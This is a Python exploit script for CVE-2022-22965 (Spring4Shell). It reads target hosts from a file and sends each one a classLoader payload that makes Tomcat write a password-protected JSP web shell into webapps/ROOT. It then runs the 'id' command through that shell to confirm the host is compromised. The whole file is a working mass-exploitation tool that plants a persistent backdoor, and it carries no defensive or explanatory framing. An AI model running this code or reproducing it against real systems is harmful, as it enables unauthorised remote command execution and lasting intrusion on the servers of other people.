# coding:utf-8
import os
# CVE-2022-22965
import requests
f = open('./text.txt',encoding='utf-8')
c = f.readlines()
headers = {
    "suffix": "%>//",
    "c1": "Runtime",
    "c2": "<%"
}
payload1 = '/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i if("fuck".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=fuck&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='
payload2 = '/fuck.jsp?pwd=fuck&cmd=id'
for i in range(len(c)):
    ip = "http://" + c[i].replace('\n','')
    try:
        U1 = requests.get(url=ip + payload1, headers=headers, verify=False, timeout=3)
        U2 = requests.get(url=ip + payload2, verify=False, timeout=3)
        if U2.status_code == 200:
            print(f"The VULN CVE-2022-22965 exists, payload is :{payload2.replace('/', '')}",ip+payload2)
    except Exception as e:
        print(e)
f.close()